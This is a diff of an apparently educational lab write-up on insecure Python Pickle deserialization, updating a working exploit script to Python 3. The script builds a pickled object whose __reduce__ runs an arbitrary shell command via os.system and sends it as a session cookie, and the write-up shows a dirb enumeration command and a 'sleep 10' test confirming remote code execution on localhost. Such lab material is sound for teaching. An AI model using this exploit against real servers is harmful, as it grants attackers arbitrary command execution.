@@ -20,7 +20,7 @@ $ dirb http://localhost:5000 /usr/share/wordlists/dirb/common.txt
     <img src="attack2.png"/>
 </p>
 
-When accessed, the `/admin` page exposes an authentication screen, as depicted by the image: 
+When accessed, the `/admin` page exposes an authentication screen, as depicted by the image:
 
 <p align="center">
     <img src="attack3.png"/>
@@ -50,9 +50,6 @@ If an atacker knew that the app is using Pickle as the serialization method, he 
 ```python
 import pickle
 import os
-import datetime
-import uuid
-import subprocess
 import base64
 import sys
 import requests
@@ -60,26 +57,28 @@ import requests
 cmd = str(sys.argv[1])
 url = str(sys.argv[2])
 
+
 class Exploit(object):
     def __reduce__(self):
         return (os.system, (cmd, ))
 
+
 pickle_result = pickle.dumps(Exploit())
 
-result = base64.b64encode(pickle_result)
+result = str(base64.b64encode(pickle_result), "utf-8")
 
-print result
-print cmd
-print url
+print(result)
+print(cmd)
+print(url)
 
 cookie = {'sessionId': result}
 
-print cookie
+print(cookie)
 
 r = requests.get(url, cookies=cookie)
 ```
 
-In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution: 
+In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution:
 
 ```sh
 $ python serializaPickle.py "sleep 10" http://localhost:5000/user
